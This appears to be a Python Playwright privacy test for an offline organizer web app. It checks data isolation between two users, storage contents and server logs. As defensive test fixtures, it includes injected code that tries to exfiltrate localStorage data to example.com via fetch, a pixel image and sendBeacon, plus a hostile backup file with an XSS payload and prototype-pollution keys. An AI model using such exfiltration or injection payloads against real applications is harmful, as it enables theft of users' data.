"""Privacy and isolation test: two independent browser contexts = two people
(or two devices) using the same published app at the same address.
Usage: python3 privacy-test.py <app_dir> <out_dir>

It checks, with real browsers and a logging web server:
  - each person's records stay in their own browser; nothing is mixed;
  - the server (e.g. GitHub Pages) only ever receives GET requests for the
    app's own files: no personal data, no uploads, no third-party addresses;
  - no cookies, sessionStorage or IndexedDB; the offline cache holds app files only;
  - the Content-Security-Policy blocks sending data to other sites;
  - a backup from another organizer needs a separate confirmation;
  - an odd or hostile backup file does not break the app.
"""
import functools, http.server, json, os, re, shutil, socketserver, sys, threading, traceback, urllib.parse
from playwright.sync_api import sync_playwright

SRC, OUT = sys.argv[1], sys.argv[2]
os.makedirs(OUT, exist_ok=True)
SITE = os.path.join(OUT, 'site')
shutil.rmtree(SITE, ignore_errors=True)
shutil.copytree(SRC, SITE)

LOG = []  # every request the server receives: (method, path, body_length)
LOCK = threading.Lock()


class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass
    def end_headers(self):
        self.send_header('Cache-Control', 'no-store')
        super().end_headers()
    def _log(self):
        n = int(self.headers.get('Content-Length') or 0)
        body = self.rfile.read(n) if n else b''
        with LOCK:
            LOG.append((self.command, self.path, len(body), dict(self.headers)))
    def do_GET(self):
        self._log(); super().do_GET()
    def do_HEAD(self):
        self._log(); super().do_HEAD()
    def _refuse(self):
        self._log(); self.send_error(405)
    do_POST = do_PUT = do_PATCH = do_DELETE = do_OPTIONS = _refuse


Handler.extensions_map = {**http.server.SimpleHTTPRequestHandler.extensions_map,
                          '.js': 'text/javascript', '.webmanifest': 'application/manifest+json'}
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.ThreadingTCPServer(('127.0.0.1', 0), functools.partial(Handler, directory=SITE))
threading.Thread(target=srv.serve_forever, daemon=True).start()
BASE = f'http://127.0.0.1:{srv.server_address[1]}/'

ASSETS = json.loads(re.search(r"const ASSETS = (\[[\s\S]*?\]);", open(os.path.join(SITE, 'sw.js'), encoding='utf-8').read()).group(1).replace("'", '"'))
ALLOWED_PATHS = {'/' + a[2:] for a in ASSETS} | {'/', '/sw.js', '/favicon.ico'}

results = []
def check(name, cond, detail=''):
    results.append((name, bool(cond), detail))

def step(name):
    def deco(fn):
        try:
            fn()
        except Exception as e:
            results.append((name, False, 'EXCEPTION: ' + str(e).splitlines()[0]))
            traceback.print_exc()
        return fn
    return deco

MARK_A = ['A-секрет-задача', 'A-секрет-событие', 'A-секрет-проект', 'A-секрет-список', 'A-секрет-пункт', 'A-секрет-ожидание', 'A-секрет-повтор']
MARK_B = ['B-secret-task', 'B-secret-event', 'B-secret-project', 'B-secret-list', 'B-secret-item', 'B-secret-waiting', 'B-secret-repeat']
ALL_MARKS = MARK_A + MARK_B
def encodings(s):
    return {s, urllib.parse.quote(s), urllib.parse.quote_plus(s), s.encode('unicode_escape').decode()}
def leaks(text):
    return [m for m in ALL_MARKS for e in encodings(m) if e in text] + [p for p in ('секрет', 'secret') if p in text]

with sync_playwright() as p:
    browser = p.chromium.launch()
    page_errors, page_requests, csp_reports, failed = [], [], [], {}

    def person(lang_en=False):
        c = browser.new_context(viewport={'width': 390, 'height': 844}, timezone_id='Europe/Athens', accept_downloads=True)
        c.on('request', lambda r: page_requests.append((r.method, r.url)))
        c.on('requestfailed', lambda r: failed.__setitem__(r.url, r.failure))
        q = c.new_page()
        q.on('pageerror', lambda e: page_errors.append(str(e)))
        q.on('console', lambda m: csp_reports.append(m.text) if 'Content Security Policy' in m.text else None)
        q.dialogs = []
        q.dismiss_with = []
        def on_dialog(d):
            q.dialogs.append(d.message)
            if any(x in d.message for x in q.dismiss_with): d.dismiss()
            else: d.accept()
        q.on('dialog', on_dialog)
        q.goto(BASE)
        q.wait_for_function('window.__organizerReady === true')
        if lang_en:
            q.click('button[data-action="language.set"][data-mode="en"]')
        q.click('[data-action="onboarding.skip"]')
        q.wait_for_selector('nav button')
        return c, q

    def tab(q, i):
        q.click(f'nav button >> nth={i}')

    def fill_data(q, marks):
        task, event, project, lst, item, wait, rep = marks
        q.fill('form[data-form="task.quickAdd"] textarea', task)
        q.click('form[data-form="task.quickAdd"] button[type=submit]')
        tab(q, 1)
        q.fill('form[data-form="cal.add"] input[name=title]', event)
        q.fill('form[data-form="cal.add"] input[name=time]', '10:00')
        q.click('form[data-form="cal.add"] button[value=event]')
        tab(q, 3)
        q.fill('form[data-form="project.add"] input[name=name]', project)
        q.fill('form[data-form="project.add"] input[name=total]', '10')
        q.fill('form[data-form="project.add"] input[name=unit]', 'x')
        q.click('form[data-form="project.add"] button[type=submit]')
        tab(q, 4)
        q.fill('form[data-form="list.add"] input[name=name]', lst)
        q.click('form[data-form="list.add"] button[type=submit]')
        q.fill('form[data-form="item.add"] input[name=title]', item)
        q.press('form[data-form="item.add"] input[name=title]', 'Enter')
        q.locator('[data-action="list.saveTemplate"]').first.click()
        tab(q, 2)
        q.click('main details:has(form[data-form="series.add"]) > summary')
        q.fill('form[data-form="series.add"] input[name=title]', rep)
        q.click('form[data-form="series.add"] button[type=submit]')
        tab(q, 0)
        q.fill('form[data-form="wait.add"] input[name=title]', wait)
        q.click('form[data-form="wait.add"] button[type=submit]')

    dump = lambda q: q.evaluate("JSON.stringify(Object.fromEntries(Object.keys(localStorage).map(k => [k, localStorage.getItem(k)])))")
    ca, a = person()
    cb, b = person(lang_en=True)

    @step('Две независимые записи')
    def _():
        fill_data(a, MARK_A)
        fill_data(b, MARK_B)
        da, db = dump(a), dump(b)
        check('A: все свои записи сохранены (задача, событие, проект, список, пункт, ожидание, повтор)', all(m in da for m in MARK_A))
        check('B: все свои записи сохранены', all(m in db for m in MARK_B))
        check('A не содержит ни одной записи B', not any(m in da for m in MARK_B))
        check('B не содержит ни одной записи A', not any(m in db for m in MARK_A))
        ida = a.evaluate("JSON.parse(localStorage.getItem('organizer:data')).dataId")
        idb = b.evaluate("JSON.parse(localStorage.getItem('organizer:data')).dataId")
        check('У A и B разные случайные id органайзера', ida and idb and ida != idb)
        for q in (a, b):
            q.reload(); q.wait_for_function('window.__organizerReady === true')
        seen = {}
        for name, q in (('A', a), ('B', b)):
            seen[name] = ''
            for i in range(6):
                tab(q, i); seen[name] += q.inner_text('main')
        check('После перезапуска каждый видит на всех вкладках только своё',
              all(m in seen['A'] for m in MARK_A) and not any(m in seen['A'] for m in MARK_B) and all(m in seen['B'] for m in MARK_B) and not any(m in seen['B'] for m in MARK_A))
        tab(a, 0); tab(b, 0)
        check('Язык B (English) не повлиял на A', a.inner_text('#app-title') == 'Мой органайзер' and b.inner_text('#app-title') == 'My Organizer')

    @step('Только свои ключи хранилища')
    def _():
        for name, q in (('A', a), ('B', b)):
            keys = q.evaluate("Object.keys(localStorage)")
            check(f'{name}: приложение пишет только ключи organizer:*', keys and all(k.startswith('organizer:') for k in keys), str(keys))
            check(f'{name}: нет cookies', not q.context.cookies())
            check(f'{name}: нет sessionStorage', q.evaluate("sessionStorage.length") == 0)
            check(f'{name}: нет баз IndexedDB', q.evaluate("indexedDB.databases().then(l => l.length)") == 0)

    @step('Офлайн-кэш')
    def _():
        for name, q in (('A', a), ('B', b)):
            q.evaluate('navigator.serviceWorker.ready')
            info = q.evaluate("""async () => {
              const out = [];
              for (const k of await caches.keys()) {
                const c = await caches.open(k);
                for (const r of await c.keys()) out.push({ cache: k, url: r.url, body: await (await c.match(r)).text() });
              }
              return out; }""")
            paths = {urllib.parse.urlparse(x['url']).path for x in info}
            check(f'{name}: офлайн-кэш содержит только файлы приложения', info and paths <= ALLOWED_PATHS, str(sorted(paths - ALLOWED_PATHS)))
            check(f'{name}: в офлайн-кэше нет личных данных', not any(leaks(x['body']) for x in info))
            check(f'{name}: один кэш текущей версии', len({x['cache'] for x in info}) == 1, str({x['cache'] for x in info}))

    @step('Отправка данных на другие сайты блокируется')
    def _():
        r = a.evaluate("""async () => {
          const seen = [];
          document.addEventListener('securitypolicyviolation', e => seen.push(e.blockedURI + ' ' + e.violatedDirective));
          const data = encodeURIComponent(localStorage.getItem('organizer:data').slice(0, 80));
          let fetchBlocked = false;
          try { await fetch('https://example.com/collect?d=' + data, { method: 'POST', body: data }); } catch { fetchBlocked = true; }
          const img = new Image(); img.src = 'https://example.com/pixel.png?d=' + data; document.body.appendChild(img);
          let beacon = null; try { beacon = navigator.sendBeacon('https://example.com/b', data); } catch { beacon = 'error'; }
          const s = document.createElement('script'); s.src = 'https://example.com/x.js'; document.body.appendChild(s);
          await new Promise(r => setTimeout(r, 500));
          img.remove(); s.remove();
          return { fetchBlocked, beacon, seen };
        }""")
        check('CSP: fetch на чужой сайт заблокирован', r['fetchBlocked'], str(r))
        check('CSP: картинка с чужого сайта (утечка через адрес) заблокирована', any('pixel.png' in s and 'img-src' in s for s in r['seen']), str(r['seen']))
        check('CSP: sendBeacon на чужой сайт заблокирован', any('example.com/b' in s for s in r['seen']) or r['beacon'] in (False, 'error'), str(r))
        check('CSP: чужой скрипт не загружается', any('x.js' in s and 'script-src' in s for s in r['seen']), str(r['seen']))
        ext = [u for (_, u) in page_requests if not u.startswith(BASE) and not u.startswith('data:') and not u.startswith('blob:')]
        not_blocked = [u for u in ext if failed.get(u) not in ('csp', 'net::ERR_BLOCKED_BY_CSP')]
        check('Каждая попытка обратиться к стороннему адресу остановлена браузером по CSP, до сети', ext and not not_blocked, str([(u[:60], failed.get(u)) for u in not_blocked][:3]))

    @step('Чужая резервная копия')
    def _():
        tab(b, 5)
        with b.expect_download() as dl:
            b.click('main button[data-action="backup.export"]')
        path_b = os.path.join(OUT, 'backup-B.json')
        dl.value.save_as(path_b)
        text_b = open(path_b, encoding='utf-8').read()
        check('Экспорт B содержит только данные B', all(m in text_b for m in MARK_B) and not any(m in text_b for m in MARK_A))
        before = a.evaluate("localStorage.getItem('organizer:data')")
        tab(a, 5)
        a.set_input_files('input[data-action="import.file"]', path_b)
        a.wait_for_selector('button[data-action="import.apply"]', timeout=5000)
        check('A: предпросмотр предупреждает, что копия из другого органайзера', 'другом органайзере' in a.inner_text('main'))
        a.dismiss_with = ['ДРУГОГО']
        a.click('button[data-action="import.apply"]')
        check('A: без отдельного подтверждения чужая копия не импортируется',
              any('ДРУГОГО' in d for d in a.dialogs) and a.evaluate("localStorage.getItem('organizer:data')") == before)
        a.click('button[data-action="import.cancel"]')
        a.dismiss_with = []

    @step('Странный файл резервной копии')
    def _():
        evil = ('{"app":"organizer","kind":"backup","exportedAt":{"toString":1},"appVersion":["x"],"data":{"schemaVersion":3,'
                '"__proto__":{"polluted":1},"dataId":"zz",'
                '"tasks":[{"id":"t1","title":"<img src=x onerror=alert(1)>","plan":{"kind":"none"},"done":false,"__proto__":{"polluted":1}},'
                '{"id":"constructor","title":"constructor","plan":{"kind":"none"},"done":false}],'
                '"quarantine":[{"reason":"constructor","collection":{"toString":1},"at":{"toString":1}},{"reason":{"key":"__proto__"}},"x"]}}')
        path = os.path.join(OUT, 'odd.json')
        open(path, 'w', encoding='utf-8').write(evil)
        n_err = len(page_errors)
        tab(a, 5)
        a.set_input_files('input[data-action="import.file"]', path)
        a.wait_for_selector('button[data-action="import.apply"]', timeout=5000)
        a.click('button[data-action="import.apply"]')  # both confirmations accepted
        a.reload(); a.wait_for_function('window.__organizerReady === true')
        tab(a, 5)
        txt = a.inner_text('main')
        check('Странный файл: «Данные» открываются, карантин показан, ошибок нет', 'Карантин' in txt and len(page_errors) == n_err and 'Что-то пошло не так' not in txt, str(page_errors[n_err:]))
        tab(a, 2)
        check('Странный файл: HTML в названии показан как текст', '<img src=x' in a.inner_text('main') and a.locator('main img').count() == 0)
        check('Странный файл: прототип объектов не изменён', a.evaluate("({}).polluted") is None)
        rb = a.evaluate("JSON.parse(localStorage.getItem('organizer:rollback'))")
        check('Странный файл: прежние данные A сохранены в копии для отката', rb and any(MARK_A[0] in json.dumps(c, ensure_ascii=False) for c in rb))

    page_errors_final = list(page_errors)
    browser.close()

srv.shutdown()

# ---- what the server (GitHub Pages in real life) received ----
methods = sorted({m for m, *_ in LOG})
paths = sorted({urllib.parse.urlparse(pth).path for _, pth, *_ in LOG})
bad_paths = [x for x in paths if x not in ALLOWED_PATHS]
bodies = [x for x in LOG if x[2] > 0]
leaky = [x for x in LOG if leaks(urllib.parse.unquote(x[1])) or any(leaks(str(v)) for v in x[3].values())]
check('Сервер получил только GET-запросы', methods and set(methods) <= {'GET', 'HEAD'}, str(methods))
check('Сервер получил запросы только к файлам приложения', not bad_paths, str(bad_paths))
check('Ни один запрос не содержал тела (ничего не отправлялось)', not bodies, str(bodies[:2]))
check('Ни в одном адресе или заголовке запроса нет личных данных', not leaky, str(leaky[:2]))
check('Нет необработанных ошибок JavaScript', not [e for e in page_errors_final], '; '.join(page_errors_final[:3]))

json.dump({'requests': [{'method': m, 'path': pth, 'body': n} for m, pth, n, _ in LOG]}, open(os.path.join(OUT, 'server-log.json'), 'w'), indent=1)
passed = sum(1 for r in results if r[1])
print(f'PRIVACY: {passed}/{len(results)} checks passed · server saw {len(LOG)} requests, methods {methods}, {len(paths)} distinct paths')
for name, ok, detail in results:
    print(('  ✓ ' if ok else '  ✗ ') + name + (f'  — {detail}' if detail and not ok else ''))
json.dump([{'name': n, 'ok': o, 'detail': d} for n, o, d in results], open(os.path.join(OUT, 'privacy-results.json'), 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
sys.exit(0 if passed == len(results) else 1)
